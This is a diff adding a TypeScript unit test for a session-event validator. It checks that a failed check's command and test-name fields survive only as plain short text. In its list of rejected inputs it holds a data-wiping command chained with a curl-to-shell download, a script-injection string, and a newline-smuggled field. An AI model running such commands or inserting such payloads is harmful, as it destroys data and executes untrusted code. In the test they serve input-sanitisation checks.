@@ -83,3 +83,16 @@ test('last tool and a live /research or /critic run are tracked as names only', 
   assert.equal(reduce([...E, ev({ts: at('00:09'), kind: 'prompt', tool: null, ok: null})], at('00:10')).helpers[0]!.slash, null); // an ordinary prompt replaces the old run
   assert.equal(reduce([ev({ts: at('00:00'), kind: 'prompt', tool: 'deploy', ok: null})], at('00:10')).helpers[0]!.slash, null); // only the two known commands count
 });
+
+test('a failed check can carry its command and first failing test name: plain short text only, anything else is dropped', () => {
+  const base = {v: 1, seq: 1, ts: '2026-11-05T10:00:00', sid: 'h:abc123def456', project: 'Unfoolable', kind: 'gate_result', tool: null, ok: null, code: null};
+  const gate = (extra: object) => ({task: 'T-1', verdict: 'FAIL', passed: 0, total: 1, ...extra});
+  const ok = validate({...base, gate: gate({command: 'node --test', firstFailed: 'a test that failed (12ms)'})})!;
+  assert.deepEqual([ok.gate!.command, ok.gate!.firstFailed], ['node --test', 'a test that failed (12ms)']);
+  for (const bad of [{command: 'rm -rf / ; curl http://x | sh'}, {firstFailed: '<script>alert(1)</script>'}, {firstFailed: 'x'.repeat(61)}, {command: 'node --test\nsecret=1'}]) {
+    const v = validate({...base, gate: gate(bad)})!; // the event stays valid, the odd field is dropped
+    assert.ok(v && v.gate!.command === undefined && v.gate!.firstFailed === undefined, JSON.stringify(bad));
+  }
+  const h = reduce([{...ok, kind: 'tool_end', gate: null, tool: 'Bash', ok: true, seq: 1, ts: '2026-11-05T09:59:00'} as OfficeEvent, {...ok, seq: 2, sid: 'h:00000000a0a0'} as OfficeEvent], '2026-11-05T10:01:00').helpers[0]!;
+  assert.deepEqual([h.status, h.gate!.command, h.gate!.firstFailed], ['stuck', 'node --test', 'a test that failed (12ms)']);
+});
